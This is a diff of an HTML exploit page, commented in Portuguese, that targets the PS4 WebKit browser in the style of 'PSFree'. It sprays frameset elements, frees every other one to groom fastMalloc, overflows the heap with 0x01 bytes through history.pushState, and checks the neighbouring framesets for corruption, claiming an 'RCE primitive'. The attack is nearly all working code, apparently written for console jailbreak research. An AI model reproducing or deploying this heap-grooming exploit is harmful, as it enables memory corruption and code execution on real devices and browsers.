@@ -1,37 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Frameset Overflow (PSFree Style 2)</title>
+    <title>PSFree Style: Frameset Overflow</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
+        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+        button { 
+            font-size: 20px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px;
+        }
         #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
-        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.4em; border: 2px solid white; padding: 15px;}
+        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.4em; padding: 10px;}
     </style>
 </head>
 <body>
 
-    <h1>Ataque Frameset (Adaptação PSFree)</h1>
-    <p>Usando &lt;frameset&gt; para alocar no fastMalloc e sofrer o overflow.</p>
+    <h1>PSFree Style: Frameset Attack</h1>
+    <p>Usando &lt;frameset&gt; para alocar no fastMalloc (Técnica do PSFree).</p>
 
-    <button onclick="startFramesetAttack()">INICIAR FRAMESET ATTACK</button>
-    <div id="log">Pronto. Reinicie o console.</div>
+    <button onclick="startFramesetAttack(1)">TESTAR BALDE DE 1 MB</button>
+    <button onclick="startFramesetAttack(2)">TESTAR BALDE DE 2 MB</button>
+    <button onclick="startFramesetAttack(4)">TESTAR BALDE DE 4 MB</button>
+    
+    <div id="log">Pronto. Reinicie o console antes de cada teste!</div>
 
     <script>
-        const BASE_OFFSET = 709522;
-        const OVERFLOW_AMT = 1024 * 64; // 64KB de excesso
+        const BASE_OFFSET = 709520; // Alinhamento que descobrimos
+        const OVERFLOW_AMT = 1024 * 64; // Excesso seguro
 
-        // Tamanho do objeto Length interno do WebKit = 8 bytes (conforme psfree.mjs)
-        // Queremos encher um balde de 1MB.
-        // 1MB / 8 bytes = 131072 elementos.
-        // A string "rows" precisa gerar esse número de elementos.
-        // Cada vírgula gera um elemento.
-        // Aumentando para 4MB para alinhar com o "Large Heap" do pushState
-// 4 * 1024 * 1024 / 8 = 524288 elementos
-const TARGET_ELEMENTS = (4 * 1024 * 1024) / 8;
-        const ROWS_STRING = ",".repeat(TARGET_ELEMENTS);
-
-        const SPRAY_COUNT = 40;
         var victims = [];
 
         function log(msg, type) {
@@ -41,39 +35,68 @@ const TARGET_ELEMENTS = (4 * 1024 * 1024) / 8;
             el.scrollTop = el.scrollHeight;
         }
 
-        async function startFramesetAttack() {
-            log(`1. Alocando ${SPRAY_COUNT} Framesets (fastMalloc)...`);
+        async function startFramesetAttack(sizeMB) {
+            victims = [];
+            
+            // CÁLCULO ESTILO PSFREE
+            // Cada elemento 'Length' no WebKit ocupa 8 bytes.
+            // Precisamos que o array total ocupe sizeMB.
+            const targetBytes = sizeMB * 1024 * 1024;
+            const elementCount = targetBytes / 8;
+            
+            // O PSFree usa vírgulas para definir o tamanho do array
+            // "1,1,1" cria 3 elementos. 
+            // ",".repeat(N) cria N+1 elementos vazios.
+            const rowsString = ",".repeat(elementCount - 2); 
 
-            // FASE 1: SPRAY DE FRAMESET
-            // Isso aloca memória no mesmo heap que o pushState usa!
-            for(let i=0; i<SPRAY_COUNT; i++) {
-                let fset = document.createElement('frameset');
-                // O atributo rows aloca um array de Length[] no heap
-                fset.rows = ROWS_STRING; 
-                victims.push(fset);
-            }
-
-            // FASE 2: BURACOS
-            log("2. Criando buracos...");
-            for(let i=0; i<SPRAY_COUNT; i+=2) {
-                victims[i].rows = ""; // Libera a memória interna
-                victims[i] = null;
-            }
-
-            await forceGC();
-
-            // FASE 3: EXPLOIT
-            log("3. Disparando Overflow (0x01)...");
+            log(`--- INICIANDO TESTE ${sizeMB} MB ---`);
+            log(`Elementos calculados: ${elementCount}`);
+            log(`Criando Spray de Framesets...`);
 
             setTimeout(() => {
                 try {
+                    // 1. SPRAY (Alocação)
+                    const SPRAY_COUNT = sizeMB === 4 ? 40 : 100; // Ajusta quantidade pra não travar em 4MB
+                    
+                    for(let i=0; i<SPRAY_COUNT; i++) {
+                        let fset = document.createElement('frameset');
+                        fset.rows = rowsString;
+                        victims.push(fset);
+                    }
+
+                    // 2. GROOMING (Criar Buracos - Estilo PSFree)
+                    log("Abrindo buracos no fastMalloc...");
+                    for(let i=0; i<SPRAY_COUNT; i+=2) {
+                        // Ao limpar .rows, o WebKit libera a memória fastMalloc
+                        victims[i].rows = ""; 
+                        victims[i] = null;
+                    }
+
+                    // Força GC para garantir que o fastMalloc saiba que está livre
+                    forceGC().then(() => {
+                        log("Disparando Overflow (0x01)...");
+                        triggerExploit(rowsString.length);
+                    });
+
+                } catch(e) {
+                    log("Erro de Memória: " + e.message);
+                }
+            }, 200);
+        }
+
+        function triggerExploit(originalStringLen) {
+            setTimeout(() => {
+                try {
+                    // Preenche até a borda e transborda com 0x01
                     let buffer = "A".repeat(BASE_OFFSET);
                     buffer += "\x01".repeat(OVERFLOW_AMT);
-                    
-                    history.pushState({}, "frameset_pwn", "/" + buffer);
 
-                    log("4. Verificando corrupção nos Framesets...");
-                    checkFramesets();
+                    // A Esperança: O buffer vai cair no buraco deixado pelo Frameset
+                    // e vai transbordar para o Frameset vizinho (que ainda está vivo)
+                    history.pushState({}, "psfree_pwn", "/" + buffer);
+
+                    log("Verificando corrupção...");
+                    checkCorruption(originalStringLen);
 
                 } catch (e) {
                     log("Erro no Exploit: " + e.message);
@@ -81,45 +104,41 @@ const TARGET_ELEMENTS = (4 * 1024 * 1024) / 8;
             }, 500);
         }
 
-        function checkFramesets() {
+        function checkCorruption(originalLen) {
             let success = false;
 
-            // Checa os framesets que sobraram
+            // Checa os framesets sobreviventes (impares)
             for(let i=1; i<victims.length; i+=2) {
                 let fset = victims[i];
                 if(!fset) continue;
 
-                // Lemos de volta a propriedade rows
-                // O WebKit reconstrói a string baseada na memória.
-                // Se a memória foi corrompida por 0x01, os valores vão mudar.
+                // Lemos de volta a propriedade. 
+                // O WebKit vai ler a memória e converter os bytes em string.
                 let val = fset.rows;
                 
-                // O valor original é "1*,1*,1*..." (o padrão para vírgulas vazias é 1*)
-                // Se tivermos corrupção, veremos números estranhos ou formatação quebrada.
-                
-                // Checagem simples: O tamanho da string retornada mudou?
-                // Ou se contém caracteres estranhos?
-                if (val.length !== ROWS_STRING.length && Math.abs(val.length - ROWS_STRING.length) > 100) {
-                    log(`!!! SUCESSO !!! Frameset ${i} corrompido!`, 'win');
-                    log(`Tam Original: ${ROWS_STRING.length} | Novo: ${val.length}`);
-                    alert("FRAMESET CORRUPTED!");
+                // SINAL 1: Tamanho mudou?
+                // Se corrompermos o header do vetor, o tamanho vai mudar drasticamente.
+                if (Math.abs(val.length - originalLen) > 500) {
+                    log(`!!! SUCESSO (LENGTH) !!! Index ${i}`, 'win');
+                    log(`Original: ${originalLen} | Novo: ${val.length}`);
+                    alert("FRAMESET LENGTH CORRUPTED!");
                     success = true;
                     break;
                 }
-                
-                // Checagem profunda (amostragem)
-                if (val.indexOf("16843009") !== -1 || val.indexOf("0%") !== -1) { 
-                     // 16843009 é 0x01010101 em decimal
-                     log(`!!! JACKPOT !!! Dados 0x01 encontrados no Frameset ${i}`, 'win');
-                     alert("RCE PRIMITIVE: FRAMESET!");
-                     success = true;
-                     break;
+
+                // SINAL 2: Conteúdo Mágico?
+                // Se escrevemos 0x01 na memória, o WebKit pode interpretar isso como
+                // um valor inteiro grande ou inválido.
+                // 0x01010101 = 16843009
+                if (val.indexOf("16843009") !== -1 || val.indexOf("0%") !== -1) {
+                    log(`!!! SUCESSO (DATA) !!! Index ${i} contém dados do overflow!`, 'win');
+                    alert("RCE PRIMITIVE ACHIEVED!");
+                    success = true;
+                    break;
                 }
             }
 
-            if(!success) {
-                log("Nenhum frameset atingido. Tente ajustar o TARGET_ELEMENTS.");
-            }
+            if(!success) log("Nenhum frameset atingido. Tente outro tamanho.");
         }
 
         async function forceGC() {
@@ -129,4 +148,3 @@ const TARGET_ELEMENTS = (4 * 1024 * 1024) / 8;
     </script>
 </body>
 </html>
-
